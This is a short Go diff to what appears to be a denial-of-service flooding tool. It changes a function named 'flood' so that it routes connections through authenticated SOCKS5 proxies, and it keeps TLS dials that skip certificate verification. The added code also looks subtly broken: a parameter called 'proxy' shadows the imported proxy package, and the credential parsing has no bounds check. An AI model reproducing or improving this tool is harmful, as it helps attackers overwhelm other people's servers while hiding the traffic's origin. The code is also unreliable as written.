@@ -7,6 +7,7 @@ import (
 	"io"
 	"math/rand"
 	"net"
+	"net/http"
 	"net/url"
 	"os"
 	"os/exec"
@@ -15,6 +16,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"golang.org/x/net/proxy"
 )
 
 var (
@@ -196,11 +199,25 @@ func flood(proxy string, wg *sync.WaitGroup, timeoutChan <-chan time.Time) {
 					s, err = tls.Dial("tcp", proxyURL.Host, &tls.Config{
 						InsecureSkipVerify: true,
 					})
-				} else if strings.HasPrefix(proxy, "socks4") || strings.HasPrefix(proxy, "socks5") {
-					dialer := &net.Dialer{
-						Timeout: timeout,
+				} else if strings.HasPrefix(proxy, "socks5") {
+					proxyParts := strings.Split(proxy, "://")
+					if len(proxyParts) != 2 {
+						continue
 					}
-					s, err = dialer.Dial("tcp", proxy)
+					authParts := strings.Split(proxyParts[1], "@")
+					var auth *proxy.Auth
+					if len(authParts) == 2 {
+						auth = &proxy.Auth{
+							User:     strings.Split(authParts[0], ":")[0],
+							Password: strings.Split(authParts[0], ":")[1],
+						}
+						proxyParts[1] = authParts[1]
+					}
+					dialer, err := proxy.SOCKS5("tcp", proxyParts[1], auth, proxy.Direct)
+					if err != nil {
+						continue
+					}
+					s, err = dialer.Dial("tcp", addr)
 				}
 			} else {
 				if port == "443" {
